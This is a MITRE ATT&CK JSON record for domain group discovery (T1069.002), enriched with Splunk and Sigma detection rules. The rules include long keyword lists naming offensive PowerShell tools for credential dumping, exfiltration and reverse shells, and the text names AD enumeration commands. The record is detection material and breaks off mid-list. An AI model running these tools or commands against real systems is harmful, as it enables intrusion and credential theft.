{
    "id": "T1069.002",
    "name": "Domain Groups",
    "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\nCommands such as `net group /domain` of the [Net](S0039) utility,  `dscacheutil -q group` on macOS, and `ldapsearch` on Linux can list domain-level groups.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Discovery",
    "data_sources": "Process: Process Creation, Command: Command Execution",
    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001).",
    "url": "https://attack.mitre.org/techniques/T1069/002",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1069.002",
                "atomic_attack_guid": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8",
                "atomic_attack_name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "Get ADUser with PowerShell",
                        "rule_link": "https://research.splunk.com/endpoint/0b6ee3f4-04e3-11ec-a87d-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1069.002",
                "atomic_attack_guid": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8",
                "atomic_attack_name": "Enumerate Active Directory Groups with Get-AdGroup",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "GetAdGroup with PowerShell",
                        "rule_link": "https://research.splunk.com/endpoint/872e3063-0fc4-4e68-b2f3-f2b99184a708/"
                    }
                ]
            },
            {
                "tech_id": "T1069.002",
                "atomic_attack_guid": "48ddc687-82af-40b7-8472-ff1e742e8274",
                "atomic_attack_name": "Adfind - Query Active Directory Groups",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PUA - AdFind Suspicious Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows AdFind Exe",
                        "rule_link": "https://research.splunk.com/endpoint/bd3b0187-189b-46c0-be45-f52da2bae67f/"
                    }
                ]
            },
            {
                "tech_id": "T1069.002",
                "atomic_attack_guid": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7",
                "atomic_attack_name": "Permission Groups Discovery PowerShell (Domain)",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "User Discovery With Env Vars PowerShell",
                        "rule_link": "https://research.splunk.com/endpoint/0cdf318b-a0dd-47d7-b257-c621c0247de8/"
                    }
                ]
            },
            {
                "tech_id": "T1069.002",
                "atomic_attack_guid": "9f4e344b-8434-41b3-85b1-d38f29d148d0",
                "atomic_attack_name": "Enumerate Active Directory Groups with ADSISearcher",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PUA - AdFind Suspicious Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "02030f2f-6199-49ec-b258-ea71b07e03dc",
                    "02773bed-83bf-469f-b7ff-e676e7d78bab",
                    "9a132afa-654e-11eb-ae93-0242ac130002",
                    "8c3a6607-b7dc-4f0d-a646-ef38c00b76ee",
                    "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                    "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
                    "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                    "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                    "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                    "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                    "75df3b17-8bcc-4565-b89b-c9898acef911",
                    "2aed01ad-3df3-4410-a8cb-11ea4ded587c",
                    "968eef52-9cff-4454-8992-1e74b9cbad6c",
                    "31d68132-4038-47c7-8f8e-635a39a7c174"
                ],
                "lookup_results": [
                    {
                        "uuid": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/02\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: derived\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ProcessCreation\n",
                            "sigma:id": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                            "title": "Malicious PowerShell Commandlets - ProcessCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                        "lookup_data": {
                            "description": "Detects default file names outputted by the BloodHound collection tool SharpHound",
                            "raw": "author: C.J. May\ndate: 2022/08/09\ndescription: Detects default file names outputted by the BloodHound collection tool\n  SharpHound\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith:\n    - _BloodHound.zip\n    - _computers.json\n    - _containers.json\n    - _domains.json\n    - _gpos.json\n    - _groups.json\n    - _ous.json\n    - _users.json\n  selection2:\n    TargetFilename|contains|all:\n    - BloodHound\n    - .zip\nfalsepositives:\n- Unknown\nid: 02773bed-83bf-469f-b7ff-e676e7d78bab\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/08/09\nreferences:\n- https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound--data-collection\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: BloodHound Collection Files\n",
                            "sigma:id": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                            "title": "BloodHound Collection Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9a132afa-654e-11eb-ae93-0242ac130002",
                        "lookup_data": {
                            "description": "AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
                            "raw": "author: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72,\n  oscd.community\ndate: 2021/02/02\ndescription: AdFind continues to be seen across majority of breaches. It is used to\n  domain trust discovery to plan out subsequent steps in the attack chain.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\nfalsepositives:\n- Legitimate admin activity\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nrelated:\n- id: 75df3b17-8bcc-4565-b89b-c9898acef911\n  type: obsoletes\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: AdFind Usage Detection\n",
                            "sigma:id": "9a132afa-654e-11eb-ae93-0242ac130002",
                            "title": "AdFind Usage Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8c3a6607-b7dc-4f0d-a646-ef38c00b76ee",
                        "lookup_data": {
                            "description": "Detects usage of the \"Get-AdGroup\" cmdlet to enumerate Groups within Active Directory",
                            "raw": "author: frack113\ndate: 2022/03/17\ndescription: Detects usage of the \"Get-AdGroup\" cmdlet to enumerate Groups within\n  Active Directory\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - 'Get-AdGroup '\n    - -Filter\nfalsepositives:\n- Unknown\nid: 8c3a6607-b7dc-4f0d-a646-ef38c00b76ee\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/17\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1069.002\ntitle: Active Directory Group Enumeration With Get-AdGroup\n",
                            "sigma:id": "8c3a6607-b7dc-4f0d-a646-ef38c00b76ee",
                            "title": "Active Directory Group Enumeration With Get-AdGroup",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                        "lookup_data": {
                            "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
                            "raw": "author: frack113\ndate: 2021/12/10\ndescription: Adversaries may look for details about the network configuration and\n  settings of systems they access or through information discovery of remote systems\ndetection:\n  condition: selection\n  selection:\n  - OriginalFileName: SharpView.exe\n  - Image|endswith: \\SharpView.exe\n  - CommandLine|contains:\n    - Add-RemoteConnection\n    - Convert-ADName\n    - ConvertFrom-SID\n    - ConvertFrom-UACValue\n    - Convert-SidToName\n    - Export-PowerViewCSV\n    - Find-DomainObjectPropertyOutlier\n    - Find-DomainProcess\n    - Find-DomainShare\n    - Find-DomainUserEvent\n    - Find-DomainUserLocation\n    - Find-ForeignGroup\n    - Find-ForeignUser\n    - Find-GPOComputerAdmin\n    - Find-GPOLocation\n    - Find-Interesting\n    - Find-LocalAdminAccess\n    - Find-ManagedSecurityGroups\n    - Get-CachedRDPConnection\n    - Get-DFSshare\n    - Get-DomainComputer\n    - Get-DomainController\n    - Get-DomainDFSShare\n    - Get-DomainDNSRecord\n    - Get-DomainFileServer\n    - Get-DomainForeign\n    - Get-DomainGPO\n    - Get-DomainGroup\n    - Get-DomainGUIDMap\n    - Get-DomainManagedSecurityGroup\n    - Get-DomainObject\n    - Get-DomainOU\n    - Get-DomainPolicy\n    - Get-DomainSID\n    - Get-DomainSite\n    - Get-DomainSPNTicket\n    - Get-DomainSubnet\n    - Get-DomainTrust\n    - Get-DomainUserEvent\n    - Get-ForestDomain\n    - Get-ForestGlobalCatalog\n    - Get-ForestTrust\n    - Get-GptTmpl\n    - Get-GroupsXML\n    - Get-LastLoggedOn\n    - Get-LoggedOnLocal\n    - Get-NetComputer\n    - Get-NetDomain\n    - Get-NetFileServer\n    - Get-NetForest\n    - Get-NetGPO\n    - Get-NetGroupMember\n    - Get-NetLocalGroup\n    - Get-NetLoggedon\n    - Get-NetOU\n    - Get-NetProcess\n    - Get-NetRDPSession\n    - Get-NetSession\n    - Get-NetShare\n    - Get-NetSite\n    - Get-NetSubnet\n    - Get-NetUser\n    - Get-PathAcl\n    - Get-PrincipalContext\n    - Get-RegistryMountedDrive\n    - Get-RegLoggedOn\n    - Get-WMIRegCachedRDPConnection\n    - Get-WMIRegLastLoggedOn\n    - Get-WMIRegMountedDrive\n    - Get-WMIRegProxy\n    - Invoke-ACLScanner\n    - Invoke-CheckLocalAdminAccess\n    - Invoke-Kerberoast\n    - Invoke-MapDomainTrust\n    - Invoke-RevertToSelf\n    - Invoke-Sharefinder\n    - Invoke-UserImpersonation\n    - Remove-DomainObjectAcl\n    - Remove-RemoteConnection\n    - Request-SPNTicket\n    - Set-DomainObject\n    - Test-AdminAccess\nfalsepositives:\n- Unknown\nid: b2317cfa-4a47-4ead-b3ff-297438c0bc2d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/tevora-threat/SharpView/\n- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview\nrelated:\n- id: dcd74b95-3f36-4ed9-9598-0490951643aa\n  type: similar\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1049\n- attack.t1069.002\n- attack.t1482\n- attack.t1135\n- attack.t1033\ntitle: Suspicious Execution of SharpView\n",
                            "sigma:id": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                            "title": "Suspicious Execution of SharpView",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
                        "lookup_data": {
                            "description": "Detects execution of Net.exe, whether suspicious or benign.",
                            "raw": "author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community\n  (improvements)\ndate: 2019/01/16\ndescription: Detects execution of Net.exe, whether suspicious or benign.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' group'\n    - ' localgroup'\n    - ' user'\n    - ' view'\n    - ' share'\n    - ' accounts'\n    - ' stop '\n    - ' start'\n  selection_img:\n  - Image|endswith:\n    - \\net.exe\n    - \\net1.exe\n  - OriginalFileName:\n    - net.exe\n    - net1.exe\nfalsepositives:\n- Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine\n  following the search for easy hunting by computer/CommandLine.\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n- https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n- https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n- https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1049\n- attack.t1018\n- attack.t1135\n- attack.t1201\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1087.001\n- attack.t1087.002\n- attack.lateral_movement\n- attack.t1021.002\n- attack.s0039\ntitle: Net.exe Execution\n",
                            "sigma:id": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
                            "title": "Net.exe Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/20\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    Payload|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    